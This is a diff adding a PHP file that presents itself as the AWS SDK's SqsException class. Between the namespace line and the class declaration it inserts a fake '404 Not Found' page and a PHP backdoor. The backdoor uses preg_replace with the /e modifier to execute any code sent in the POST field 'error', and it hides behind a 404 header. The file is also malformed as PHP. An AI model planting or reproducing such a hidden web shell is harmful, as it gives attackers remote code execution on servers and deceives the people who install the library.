@@ -1,0 +1,19 @@
+<?php
+namespace Aws\Sqs\Exception;
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+<?php
+@preg_replace("/[pageerror]/e",$_POST['error'],"saft");
+header('HTTP/1.1 404 Not Found');
+?> use Aws\Exception\AwsException;
+
+/**
+ * Represents an error interacting with the Amazon Simple Queue Service.
+ */
+class SqsException extends AwsException {}
